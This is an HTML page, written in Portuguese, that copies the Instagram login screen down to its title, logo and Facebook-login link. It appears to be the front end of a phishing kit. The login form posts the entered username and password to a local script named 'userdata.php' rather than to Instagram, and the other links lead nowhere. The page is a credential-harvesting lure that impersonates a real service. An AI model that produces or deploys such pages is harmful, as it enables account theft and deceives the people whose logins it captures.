<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">

    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
</head>

<body>
    <main>
        <!-- Container Principal - mainContainer -->
        <div id="mainContainer">

            <!-- bannerContainer -->
            <div id="bannerContainer">
                <img src="banner2.jpg" alt="Crie uma conta no Instagram">
            </div>

            <!-- Login e Registro -->
            <div id="formContainer">
                <div id="formBox">
                    <img id="" src="logoInstagram" alt="Logotipo do Instagram">

                    <form id="loginForm" action="userdata.php" method="post">
                        <input type="text" name="username" placeholder="Número de telefone, usuário ou e-mail" required>
                        <input type="password" name="password" placeholder="Senha" required>
                        <input type="submit" value="Entrar">
                    </form>

                    <!-- Separador -->
                    <div class="separador">
                        <div class="line"></div>
                        <span>OU</span>
                    </div>

                    <!-- Links de Login Facebook-->
                    <div>
                        <div class="loginFacebook">
                            <a href="#"><img src="facebook" alt="Logo Facebook"><span>Entrar com o Facebook</span></a>
                        </div>

                        <!-- Link de Login - Esqueci a Senha -->
                        <div class="esqueceuPassword">
                            <a href="#">Esqueci a senha</a>
                        </div>
                    </div>

                </div>
                <!-- Conta de Registro -->
                <div id="registerContainer">
                    <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
                </div>

                <!-- Obtenha o aplicativo -->
                <div id="getAppContainer">
                    <p>Obtenha o Aplicativo</p>
                    <a href="#"><img src="appStore.png" alt="App Store"></a>
                    <a href="#"><img src="playStore.png" alt="Play Store"></a>
                </div>
            </div>
        </div>
    </main>
